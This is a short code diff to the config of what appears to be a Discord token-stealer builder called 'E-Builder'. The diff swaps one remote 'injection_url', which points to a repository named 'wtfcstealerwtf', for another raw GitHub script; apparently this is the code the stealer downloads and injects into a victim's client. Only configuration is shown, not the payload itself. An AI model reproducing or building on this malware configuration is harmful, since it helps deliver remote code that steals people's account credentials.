@@ -14,7 +14,7 @@ const config = {
   embed_name: 'E-Builder', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1239351689648017408/1241418579258114068/logo.png?ex=664a20a5&is=6648cf25&hm=710366fae4c2b5ac60d49187a78c1aaa63dba263016d4fe50b9438db8abbf8b0&',
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/69east/assets/main/index.js', 
   /**
    
    **/
